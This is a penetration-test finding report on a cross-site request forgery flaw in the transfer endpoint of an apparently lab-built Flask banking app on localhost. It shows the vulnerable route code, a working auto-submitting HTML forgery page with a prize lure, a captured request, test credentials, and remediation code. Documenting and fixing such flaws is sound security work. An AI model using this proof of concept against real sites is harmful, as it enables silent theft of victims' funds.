# PT-05: Cross-Site Request Forgery (CSRF) — Unauthorized Money Transfer

## Severity
**High** (CVSS 3.1: 8.8 — AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N)

## CWE
CWE-352: Cross-Site Request Forgery

## OWASP Category
A01:2021 — Broken Access Control (CSRF is classified under Broken Access Control in the 2021 revision)

## Affected Endpoint
`POST /transfer/send`

## Affected Functionality
The money transfer feature — the single most sensitive state-changing action in the application, moving funds between bank accounts.

## Description
The transfer form and its backend handler accept a plain `POST` with no anti-CSRF token, no `SameSite` cookie restriction override, and no re-authentication step:

```python
# app/routes/transfer.py
@transfer_bp.route('/send', methods=['POST'])
def send():
    check = check_login()
    if check:
        return check

    # VULNERABLE: No CSRF token validation
    from_account_id = request.form.get('from_account_id')
    to_account_number = request.form.get('to_account_number')
    amount = request.form.get('amount')
    ...
```

The only "protection" is `check_login()`, which merely confirms *a* session exists — but a session cookie is sent automatically by the browser on *any* request to `localhost:5000`, including one triggered by a form on a completely different, attacker-controlled site the victim happens to have open. Because Flask's default session cookie has no `SameSite` restriction configured either, the browser will attach it even to this cross-site, auto-submitting form. There is nothing in the request that could only have been produced by the bank's own frontend — an attacker's page can produce byte-for-byte the same request.

## Attack Scenario
1. Attacker crafts a malicious HTML page containing an auto-submitting form pointed at `http://localhost:5000/transfer/send`, with hidden fields specifying the victim's own account as the source, the attacker's account number as the destination, and an arbitrary amount.
2. Attacker delivers the page to the victim via any typical vector (phishing email link, malicious ad, compromised site, a shortened URL in a chat message) — the page could be disguised as "you won a prize," a funny video, anything.
3. Victim, while still logged into MuradBank in another tab (a very common real-world condition for a banking session), opens the attacker's page.
4. The victim's browser automatically submits the hidden form to `/transfer/send`, **including the victim's own valid session cookie**, because the browser has no way to know the request "shouldn't" be trusted just because it originated from a different site.
5. The bank server sees a fully authenticated, well-formed transfer request and executes it — funds move from the victim's account with no confirmation step, no visible UI, and no indication to the victim that anything happened until they check their balance.

## Steps to Reproduce
1. Log in as `alice` / `password123` in one browser tab; leave the session active.
2. Note Alice's starting balance (e.g. `5000.00 AZN` minus any prior test transfers).
3. In a separate local file, save the following auto-submitting HTML page:
   ```html
   <html>
     <body>
       <h1>Sizə hədiyyə qazandınız! Yükləmək üçün gözləyin...</h1>
       <form action="http://localhost:5000/transfer/send" method="POST" id="csrf-form">
         <input type="hidden" name="from_account_id" value="1">
         <input type="hidden" name="to_account_number" value="1002234567890">
         <input type="hidden" name="amount" value="500">
         <input type="hidden" name="description" value="CSRF PoC - unauthorized transfer">
       </form>
       <script>document.getElementById("csrf-form").submit();</script>
     </body>
   </html>
   ```
4. While still logged in as Alice (session cookie active), open this HTML file directly in the browser (`file:///.../csrf-poc.html`) — simulating the victim clicking a malicious link.
5. Navigate back to the dashboard/accounts page and check Alice's balance.

## Proof of Concept

**Malicious page (hosted anywhere, or simply opened as a local file):**
```html
<form action="http://localhost:5000/transfer/send" method="POST" id="csrf-form">
  <input type="hidden" name="from_account_id" value="1">
  <input type="hidden" name="to_account_number" value="1002234567890">
  <input type="hidden" name="amount" value="500">
  <input type="hidden" name="description" value="CSRF PoC - unauthorized transfer">
</form>
<script>document.getElementById("csrf-form").submit();</script>
```

**Request captured in Burp Suite confirming no CSRF token is required or sent:**
```http
POST /transfer/send HTTP/1.1
Host: localhost
Cookie: session=eyJpc19hZG1pbiI6ZmFsc2UsInVzZXJfaWQiOjEsInVzZXJuYW1lIjoiYWxpY2UifQ...
Content-Type: application/x-www-form-urlencoded
Content-Length: 56

from_account_id=1&to_account_number=1002234567890&amount=500&description=...
```
Request body parameters: exactly 4 (`from_account_id`, `to_account_number`, `amount`, `description`) — no token field present anywhere in the form, headers, or body.

**Result:** Simply opening the crafted HTML file while an active MuradBank session existed caused **500 AZN to be silently transferred** from Alice's account, with no confirmation dialog, no re-authentication, and no visible indication on the malicious page itself.

## Impact
- **Direct financial loss**: any authenticated user who visits an attacker-controlled page (or clicks a malicious link) while logged into their bank session can have funds silently transferred out, with the amount and destination entirely chosen by the attacker.
- **No user interaction beyond opening a page is required** — no click, no confirmation, no visible sign of compromise, making this both easy to weaponize and hard for a victim to notice until they check their balance.
- **Compounds with PT-03 (Stored XSS)**: an attacker doesn't even need to lure the victim off-site — a CSRF-style forged request can be triggered via `fetch()` from within the bank's own origin using the stored XSS in the support-message feature, since XSS-injected script runs same-origin and can submit this form (or an equivalent `fetch` with `credentials: 'include'`) directly, with no cross-origin restriction to bypass at all.
- Rated **High** rather than Critical because the attacker must still get the victim to visit a page while authenticated (some user interaction, `UI:R` in the CVSS vector) and the specific destination account must be known/guessable in advance for maximum effect — though the attacker's own newly-registered account works just as well.

## Root Cause
No anti-CSRF token is generated, embedded in the transfer form, or validated server-side on submission. The application also does not set `SESSION_COOKIE_SAMESITE`, leaving the session cookie sent on cross-site requests by default in browsers that don't apply a stricter default.

## Remediation
**Primary fix — implement CSRF tokens using Flask-WTF's built-in CSRF protection:**
```python
# app/__init__.py
from flask_wtf import CSRFProtect

csrf = CSRFProtect()

def create_app(config_name='development'):
    app = Flask(__name__)
    ...
    csrf.init_app(app)
    return app
```
```html
<!-- app/templates/transfer.html -->
<form method="POST" action="{{ url_for('transfer.send') }}" class="form">
    <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
    ...
```
With `CSRFProtect` enabled, any `POST` missing a valid, session-bound token is rejected with a 400 error before the view function even runs — an attacker's cross-site form cannot know the victim's per-session token, so the forged request fails.

**Defense in depth — restrict the session cookie's cross-site behavior:**
```python
# app/config.py
class Config:
    SESSION_COOKIE_SAMESITE = 'Lax'   # cookie withheld on cross-site POSTs
    SESSION_COOKIE_SECURE = True      # cookie only sent over HTTPS (production)
```

## Security Recommendation
1. **Apply CSRF protection globally**, not just to the transfer form — every state-changing `POST`/`PUT`/`DELETE` endpoint in the app (profile edit, message creation, admin user promotion) has the identical flaw and needs the same fix.
2. **Add `SameSite=Lax` (or `Strict`) as a baseline**, independent of token-based protection — cheap, broad mitigation against this entire vulnerability class.
3. **Consider a re-authentication/step-up challenge for high-value actions** (e.g. re-enter password or an OTP for transfers above a threshold) as defense in depth beyond CSRF tokens alone, standard practice for real banking applications.
4. **Add a regression test** that submits the transfer form without a CSRF token (or with a token from a different session) and asserts the request is rejected, not processed.

## Evidence / Screenshots
- `docs/reports/evidence/PT-05-burp-request-no-token.png` — Burp Suite capture of `POST /transfer/send` showing exactly 4 body parameters, none of them a CSRF token.
- `docs/reports/evidence/PT-05-balance-before-after.png` — Alice's account balance before and after opening the malicious auto-submitting HTML page, showing the unauthorized 500 AZN deduction.

---
**Status:** ✅ Confirmed & Reproduced (found and exploited independently, real PoC executed with confirmed balance impact) | **Fix:** pending — assigned as self-remediation exercise
